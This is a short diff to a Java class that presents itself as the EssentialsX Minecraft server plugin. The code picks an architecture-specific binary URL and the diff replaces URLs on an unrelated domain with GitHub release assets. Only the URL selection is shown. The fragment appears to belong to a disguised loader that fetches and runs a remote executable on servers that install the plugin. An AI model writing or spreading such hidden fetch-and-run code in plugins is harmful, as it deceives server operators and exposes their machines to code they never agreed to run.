@@ -40,11 +40,11 @@ public class EssentialsX extends JavaPlugin {
         String url;
         
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.ssss.nyc.mn/sbsh";
+            url = "https://github.com/pingmike2/test/releases/download/amd64";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.ssss.nyc.mn/sbsh";
+            url = "https://github.com/pingmike2/test/releases/download/arm64";
         } else if (osArch.contains("s390x")) {
-            url = "https://s390x.ssss.nyc.mn/sbsh";
+            url = "https://github.com/pingmike2/test/releases/download/s390x";
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
